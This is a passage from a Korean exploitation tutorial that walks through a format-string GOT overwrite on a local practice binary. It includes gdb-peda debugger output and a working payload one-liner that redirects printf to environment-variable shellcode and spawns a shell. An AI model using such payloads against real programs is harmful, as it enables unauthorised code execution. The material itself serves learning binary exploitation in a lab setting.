공격에 성공했다.

## [+] Training 4

이번엔 GOT Overwrite를 이용하여 공격을 해본다.
예제 소스코드에서는 두번의 `printf` 함수가 호출되므로, `dl_reslove` 함수를 거치지 않고 바로 변조해주면 된다.

```
gdb-peda$ si

[----------------------------------registers-----------------------------------]
EAX: 0xffffd5d6 --> 0x30 ('0')
EBX: 0x0 
ECX: 0x804b410 ("AAAA\n")
EDX: 0xf7fb4870 --> 0x0 
ESI: 0xf7fb3000 --> 0x1b1db0 
EDI: 0xf7fb3000 --> 0x1b1db0 
EBP: 0xffffd5d8 --> 0x0 
ESP: 0xffffd5b4 --> 0x8048505 (<main+58>:	add    esp,0x8)
EIP: 0x8048380 (<printf@plt>:	jmp    DWORD PTR ds:0x804a010)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048370 <strcmp@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048376 <strcmp@plt+6>:	push   0x0
   0x804837b <strcmp@plt+11>:	jmp    0x8048360
=> 0x8048380 <printf@plt>:	jmp    DWORD PTR ds:0x804a010
 | 0x8048386 <printf@plt+6>:	push   0x8
 | 0x804838b <printf@plt+11>:	jmp    0x8048360
 | 0x8048390 <fgets@plt>:	jmp    DWORD PTR ds:0x804a014
 | 0x8048396 <fgets@plt+6>:	push   0x10
 |->   0xf7e4a670 <__printf>:	call   0xf7f20b59 <__x86.get_pc_thunk.ax>
       0xf7e4a675 <__printf+5>:	add    eax,0x16898b
       0xf7e4a67a <__printf+10>:	sub    esp,0xc
       0xf7e4a67d <__printf+13>:	mov    eax,DWORD PTR [eax-0x68]
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xffffd5b4 --> 0x8048505 (<main+58>:	add    esp,0x8)
0004| 0xffffd5b8 --> 0x80485c0 --> 0xa7825 ('%x\n')
0008| 0xffffd5bc --> 0xffffd5d6 --> 0x30 ('0')
0012| 0xffffd5c0 --> 0x414133dc 
0016| 0xffffd5c4 --> 0xa4141 ('AA\n')
0020| 0xffffd5c8 --> 0x8048549 (<__libc_csu_init+9>:	add    ebx,0x1ab7)
0024| 0xffffd5cc --> 0x0 
0028| 0xffffd5d0 --> 0xf7fb3000 --> 0x1b1db0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048380 in printf@plt ()
gdb-peda$ x/16x 0x804a010
0x804a010:	0xf7e4a670	0xf7e5f150	0x080483a6	0xf7e19540
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
```

현재 GOT는 `0x804a010` 위치에 존재한다. 해당 위치의 4바이트를 쉘 코드가 위치한 환경변수의 주소로 변조한다.

```
root@shh0ya-Linux:~/pwn/fsb# (python -c 'print "AA\x10\xa0\x04\x08"+"AAAA\x12\xa0\x04\x08"+"%55316x%hn"+"%10205x%hn"'; cat)|./exam

AAAAAA .... 4141e550 ... 41414141

ls
a.out  env  env.c  exam  exam.c  norm.c  peda-session-a.out.txt  peda-session-exam.txt
     
pwd
/root/pwn/fsb
```

위와 같이 쉘을 획득할 수 있는 것을 볼 수 있다.











